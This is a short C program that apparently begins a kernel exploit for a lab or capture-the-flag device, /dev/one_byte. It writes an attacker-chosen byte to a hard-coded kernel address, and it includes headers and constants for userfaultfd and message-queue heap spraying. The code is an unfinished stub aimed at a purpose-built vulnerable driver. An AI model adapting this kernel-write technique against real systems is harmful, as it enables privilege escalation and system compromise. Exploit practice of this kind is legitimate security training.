#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>
#define MSG_SPRAY_SIZE 0x20
#define SPRAY_SIZE 0x200
#define PAGE_SZ 0x1000

int obfd;

struct arg { 
    unsigned long addr; 
    char value; 
} __attribute__((packed)) arg;

void success(char* suc_msg){
    printf("[+] %s\n", suc_msg);
    return;
}

void error(char* err_msg){
    printf("[:(] %s\n", err_msg);
    return;
}

int hyper_write(void* payload){
    int res = ioctl(obfd, 0xdeadbeef, payload);
    return res;
}

int main(int argc, char* argv[]){
        struct arg one_write;

        obfd = open("/dev/one_byte", O_RDWR);

        if(obfd < 0){
            error("Failed to open device");
            exit(0);
        }

        success("one_byte OPENED");

        one_write.addr = 0xffffffff810bcfc0;
        one_write.value = 'A';

        write(obfd, &one_write, 9);


        close(obfd);
}
